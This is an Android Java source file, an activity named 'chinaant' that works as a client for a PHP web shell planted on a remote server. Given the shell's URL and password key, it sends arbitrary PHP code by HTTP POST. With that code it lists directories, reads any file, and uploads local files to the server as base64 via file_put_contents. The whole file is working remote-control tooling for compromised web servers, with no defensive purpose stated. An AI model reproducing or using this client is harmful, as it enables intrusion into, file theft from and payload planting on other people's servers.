package cn.itcast.hilink;

import android.app.AlertDialog;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.StrictMode;
import android.provider.OpenableColumns;
import android.util.Base64;
import android.widget.*;
import androidx.appcompat.app.AppCompatActivity;

import java.io.*;
import java.net.*;
import java.util.ArrayList;

public class chinaant extends AppCompatActivity {

    EditText etUrl, etPassword;
    TextView tvPath;
    ListView listView;
    Button btnUp;

    String currentPath = null;
    String url, passwordKey;

    ArrayAdapter<String> adapter;
    ArrayList<String> items = new ArrayList<>();

    private static final int REQUEST_CODE_PICK_FILE = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_chinaant);
        StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build());

        etUrl = findViewById(R.id.et_url);
        etPassword = findViewById(R.id.et_password);
        tvPath = findViewById(R.id.tv_path);
        listView = findViewById(R.id.listView);
        btnUp = findViewById(R.id.btn_up);

        adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, items);
        listView.setAdapter(adapter);

        listView.setOnItemClickListener((parent, view, position, id) -> {
            String item = items.get(position);
            String newPath;
            if (currentPath.equals("/")) {
                newPath = "/" + item;
            } else {
                newPath = currentPath + "/" + item;
            }
            if (tryEnterDir(newPath)) {
                currentPath = newPath;
                loadDirectory();
            } else {
                showFileContent(newPath);
            }
        });

        findViewById(R.id.btn_send).setOnClickListener(v -> {
            url = etUrl.getText().toString().trim();
            passwordKey = etPassword.getText().toString().trim();
            if (url.isEmpty() || passwordKey.isEmpty()) {
                Toast.makeText(this, "请填写URL和密码键", Toast.LENGTH_SHORT).show();
                return;
            }
            getInitialPathAndLoad();
        });

        btnUp.setOnClickListener(v -> {
            if (currentPath == null || currentPath.equals("/")) {
                Toast.makeText(this, "已经是根目录，无法再往上了", Toast.LENGTH_SHORT).show();
                return;
            }

            String path = currentPath;
            if (path.endsWith("/") && path.length() > 1) {
                path = path.substring(0, path.length() - 1);
            }

            int lastSlash = path.lastIndexOf('/');
            if (lastSlash <= 0) {
                currentPath = "/";
            } else {
                currentPath = path.substring(0, lastSlash);
            }
            loadDirectory();
        });

        // 上传按钮事件
        findViewById(R.id.btn_upload).setOnClickListener(v -> {
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.setType("*/*");
            startActivityForResult(Intent.createChooser(intent, "选择上传文件"), REQUEST_CODE_PICK_FILE);
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_PICK_FILE && resultCode == RESULT_OK) {
            Uri uri = data.getData();
            if (uri != null) {
                uploadFileToShell(uri);
            }
        }
    }

    void uploadFileToShell(Uri uri) {
        try {
            InputStream inputStream = getContentResolver().openInputStream(uri);
            byte[] fileBytes = readBytes(inputStream);
            String fileName = getFileNameFromUri(uri);

            String base64Content = Base64.encodeToString(fileBytes, Base64.NO_WRAP);
            String php = "$f='" + currentPath + "/" + fileName + "';"
                    + "$d=base64_decode('" + base64Content + "');"
                    + "file_put_contents($f, $d);"
                    + "echo '上传完成';";

            String result = sendPhp(php);
            Toast.makeText(this, result, Toast.LENGTH_SHORT).show();
            loadDirectory();
        } catch (Exception e) {
            Toast.makeText(this, "上传失败：" + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    byte[] readBytes(InputStream inputStream) throws IOException {
        ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = inputStream.read(buffer)) != -1) {
            byteBuffer.write(buffer, 0, len);
        }
        return byteBuffer.toByteArray();
    }

    String getFileNameFromUri(Uri uri) {
        String result = null;
        if ("content".equals(uri.getScheme())) {
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            try {
                if (cursor != null && cursor.moveToFirst()) {
                    int nameIndex = cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME);
                    if (nameIndex >= 0) {
                        result = cursor.getString(nameIndex);
                    }
                }
            } finally {
                if (cursor != null) cursor.close();
            }
        }
        if (result == null) {
            result = uri.getLastPathSegment();
        }
        return result;
    }

    void getInitialPathAndLoad() {
        String php = "echo getcwd();";
        String path = sendPhp(php);
        if (path != null && !path.isEmpty()) {
            currentPath = path.trim();
            loadDirectory();
        } else {
            Toast.makeText(this, "获取初始路径失败", Toast.LENGTH_SHORT).show();
        }
    }

    void loadDirectory() {
        tvPath.setText("路径: " + currentPath);
        String php = "echo implode(\"\\n\", scandir('" + currentPath + "'));";
        String result = sendPhp(php);
        items.clear();
        if (result != null && !result.startsWith("[错误]")) {
            String[] files = result.split("\n");
            for (String f : files) {
                if (!f.equals(".") && !f.equals("..")) {
                    items.add(f.trim());
                }
            }
        } else {
            items.add("[读取失败]");
        }
        adapter.notifyDataSetChanged();
    }

    boolean tryEnterDir(String path) {
        String test = "chdir('" + path + "'); echo getcwd();";
        String result = sendPhp(test);
        return result != null && !result.toLowerCase().contains("fatal") && !result.toLowerCase().contains("warning");
    }

    void showFileContent(String path) {
        String php = "echo file_get_contents('" + path + "');";
        String content = sendPhp(php);
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("查看：" + path);
        builder.setMessage(content != null ? content : "[读取失败]");
        builder.setPositiveButton("关闭", null);
        builder.show();
    }

    String sendPhp(String code) {
        try {
            URL u = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);

            String data = passwordKey + "=" + URLEncoder.encode(code, "UTF-8");
            OutputStream os = conn.getOutputStream();
            os.write(data.getBytes());
            os.flush();
            os.close();

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = reader.readLine()) != null) {
                sb.append(l).append("\n");
            }
            reader.close();
            return sb.toString().trim();
        } catch (Exception e) {
            return "[错误] " + e.getMessage();
        }
    }
}
